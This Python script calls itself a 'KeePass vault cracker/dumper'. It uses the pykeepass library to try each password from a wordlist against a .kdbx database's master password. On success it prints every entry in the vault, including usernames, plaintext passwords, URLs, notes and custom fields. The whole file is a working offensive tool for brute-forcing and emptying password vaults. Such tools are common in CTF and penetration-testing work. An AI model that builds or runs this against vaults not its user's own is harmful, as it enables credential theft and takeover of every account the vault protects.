from pykeepass import PyKeePass
from pykeepass.exceptions import CredentialsError
import sys
import argparse


def crack(db_path, wordlist):
    print(f"Cracking from: {wordlist}")
    try:
        with open(wordlist, "r", encoding="utf-8", errors="replace") as f:
            for i, line in enumerate(f, 1):
                password = line.rstrip("\n")
                if i % 10000 == 0:
                    print(f"---- Tried {i} passwords ----", end="", flush=True)
                try:
                    kp = PyKeePass(db_path, password=password)
                    print(f"!!! Password found: {password}")
                    return kp
                except CredentialsError:
                    continue
    except FileNotFoundError:
        print(f"Wordlist not found: {wordlist}")
        sys.exit(1)
    print("Password not found in wordlist")
    sys.exit(1)


def dump(kp):
    for entry in kp.entries:
        print(f"\n=== {entry.title} ===")
        print(f"  Username:  {entry.username}")
        print(f"  Password:  {entry.password}")
        print(f"  URL:       {entry.url}")
        print(f"  Notes:     {entry.notes}")
        print(f"  Group:     {entry.group}")
        print(f"  Tags:      {entry.tags}")
        print(f"  Created:   {entry.ctime}")
        print(f"  Modified:  {entry.mtime}")
        print(f"  Expires:   {entry.expiry_time}")

        if entry.custom_properties:
            print("  Custom fields:")
            for key, value in entry.custom_properties.items():
                print(f"    {key}: {value}")


parser = argparse.ArgumentParser(description="KeePass vault cracker/dumper")
parser.add_argument("database", help="Path to .kdbx file")
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument("-p", "--password", help="Password to decrypt the vault")
group.add_argument("-w", "--wordlist", help="Wordlist for cracking the vault password")
args = parser.parse_args()

if args.password:
    try:
        kp = PyKeePass(args.database, password=args.password)
    except CredentialsError:
        print("Invalid password")
        sys.exit(1)
else:
    kp = crack(args.database, args.wordlist)

dump(kp)
